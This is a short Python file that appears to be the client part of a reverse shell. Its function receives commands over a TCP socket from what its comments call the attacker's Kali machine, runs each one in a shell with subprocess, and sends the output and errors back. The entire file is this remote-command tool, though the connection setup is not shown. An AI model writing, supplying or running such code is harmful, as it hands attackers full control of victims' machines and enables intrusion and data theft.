import socket
import subprocess
import os

outline = "--------- Command Output---------"

def terminal(s, CWD):
    while True:
        command = s.recv(1024) # keep receiving commands from the Kali machine, read the first KB of the tcp socket
        if 'exit' in command.decode(): # if we got termiante order from the attacker, close the socket and break the loop
            break
        elif 'cd' in command.decode():
            path = command.decode().split(" ")[1]
            os.chdir(path)
        elif command.decode() == 'pwd':
            s.send(CWD.encode())
        # otherwise, we pass the received command to a shell process
        CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        s.send(CMD.stdout.read()) # send back the result
        s.send(CMD.stderr.read()) # send back the error -if any-, such as syntax error